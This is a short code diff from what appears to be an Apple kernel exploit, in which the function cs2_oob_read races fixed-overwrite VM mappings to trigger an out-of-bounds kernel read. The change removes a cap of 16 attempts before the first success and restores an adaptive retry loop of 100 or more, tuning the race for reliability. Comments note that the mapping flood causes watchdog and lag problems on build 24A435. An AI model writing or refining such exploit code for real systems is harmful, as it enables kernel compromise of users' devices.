@@ -61,8 +61,7 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
        8 mappings = ~13M fixed-overwrite maps per pass = VM machine-gun
        (configd-watchdog + lag class on 24A435). Until the first success,
        cap tries at 16; once any capture wins, expand to the adaptive 100+. */
-    uint64_t try_cap = cs2_ctx.success_read_count ? (cs2_ctx.highiest_success_idx + 100) : 16;
-    for (uint64_t try_idx = 0; try_idx < try_cap; try_idx++) {
+    for (uint64_t try_idx = 0; try_idx < (cs2_ctx.highiest_success_idx + 100); try_idx++) {   /* OG: adaptive */
         if (try_idx && cs2_expired()) return KERN_FAILURE;   /* budget law: never exceed the 300s tap budget */
         atomic_store_explicit(&cs2_ctx.shared->race_sync, 1, memory_order_seq_cst);
         // trigger bug to read oob_offset oob
